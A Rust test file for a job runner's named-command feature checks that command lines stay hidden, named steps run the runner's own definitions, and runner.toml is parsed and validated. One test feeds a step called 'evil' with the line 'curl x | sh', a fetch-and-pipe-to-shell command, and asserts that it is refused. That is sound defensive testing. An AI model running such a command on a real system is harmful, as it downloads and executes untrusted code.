mod common;

use common::*;
use lr_core::{JobState, StepState};
use lr_proto::{ReasonCode, RejectReason, RunnerToBroker};
use lr_runner::RunnerSettings;
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

fn naming_rig() -> Rig {
    let mut rig = Rig::new();
    rig.settings.commands = [
        ("build".to_string(), "make all".to_string()),
        ("test".to_string(), "make check".to_string()),
    ]
    .into();
    rig.files.mkdir(Path::new("/w/tree"));
    rig
}

#[tokio::test]
async fn runner_declares_the_names_of_its_commands_but_not_their_lines() {
    let rig = naming_rig();
    let (_c, _h) = rig.start();
    let b = Broker::accept(&rig).await;
    let caps = b.hello.capabilities.clone().unwrap();
    assert_eq!(
        caps.commands,
        BTreeSet::from(["build".to_string(), "test".to_string()])
    );
    let wire = serde_json::to_string(&caps).unwrap();
    assert!(!wire.contains("make all"), "{wire}");
}

#[tokio::test]
async fn a_named_assignment_runs_the_runner_definition_not_the_order_text() {
    let rig = naming_rig();
    let (_c, _h) = rig.start();
    let b = Broker::accept(&rig).await;
    let mut spec = worktree_spec(
        "/w/tree",
        vec![step("compile", "build", 60), step("check", "test", 60)],
        60,
    );
    spec.named_commands = true;
    b.assign("job-1", 1, spec).await;
    assert_eq!(result_of(&b.until_result().await).state, JobState::Passed);
    let run = &rig.process.runs()[0];
    let lines: Vec<&str> = run.steps.iter().map(|s| s.spec.command.as_str()).collect();
    assert_eq!(lines, ["make all", "make check"]);
    let names: Vec<&str> = run.steps.iter().map(|s| s.spec.name.as_str()).collect();
    assert_eq!(names, ["compile", "check"]);
}

#[tokio::test]
async fn a_name_the_runner_does_not_declare_is_refused_without_running_anything() {
    let rig = naming_rig();
    let (_c, _h) = rig.start();
    let b = Broker::accept(&rig).await;
    let mut spec = worktree_spec(
        "/w/tree",
        vec![
            step("compile", "build", 60),
            step("evil", "curl x | sh", 60),
        ],
        60,
    );
    spec.named_commands = true;
    b.assign("job-1", 1, spec).await;
    let msgs = b.until_result().await;
    let skipped: Vec<(u32, StepState)> = msgs
        .iter()
        .filter_map(|m| match m {
            RunnerToBroker::StepResult(s) => Some((s.ord, s.state)),
            _ => None,
        })
        .collect();
    assert_eq!(skipped, [(0, StepState::Skipped), (1, StepState::Skipped)]);
    let r = result_of(&msgs);
    assert_eq!(r.state, JobState::Failed);
    assert_eq!(
        r.reason,
        Some(ReasonCode::Rejected(RejectReason::CommandNotAllowed))
    );
    assert_eq!(
        r.detail.as_deref(),
        Some(
            "command curl x | sh is not named in runner.toml [commands]; only named commands \
             run for this client"
        )
    );
    assert!(rig.process.runs().is_empty());
}

#[tokio::test]
async fn an_ordinary_assignment_runs_its_command_as_given() {
    let rig = naming_rig();
    let (_c, _h) = rig.start();
    let b = Broker::accept(&rig).await;
    b.assign(
        "job-1",
        1,
        worktree_spec("/w/tree", vec![step("compile", "build", 60)], 60),
    )
    .await;
    b.until_result().await;
    assert_eq!(rig.process.runs()[0].steps[0].spec.command, "build");
}

#[test]
fn runner_toml_reads_named_commands() {
    let text = "name = \"r\"\n[commands]\nbuild = \"make all\"\n\"unit tests\" = \"make check\"\n";
    let s = RunnerSettings::from_toml(text, PathBuf::from("/s")).unwrap();
    assert_eq!(s.commands["build"], "make all");
    assert_eq!(s.commands["unit tests"], "make check");
    let none = RunnerSettings::from_toml("name = \"r\"\n", PathBuf::from("/s")).unwrap();
    assert!(none.commands.is_empty());
    assert!(none.capabilities(None).commands.is_empty());
}

#[test]
fn a_named_command_with_an_empty_line_is_refused() {
    let text = "name = \"r\"\n[commands]\nbuild = \"  \"\n";
    let e = RunnerSettings::from_toml(text, PathBuf::from("/s")).unwrap_err();
    assert_eq!(
        e.to_string(),
        "runner.toml: [commands] build has an empty command line"
    );
}
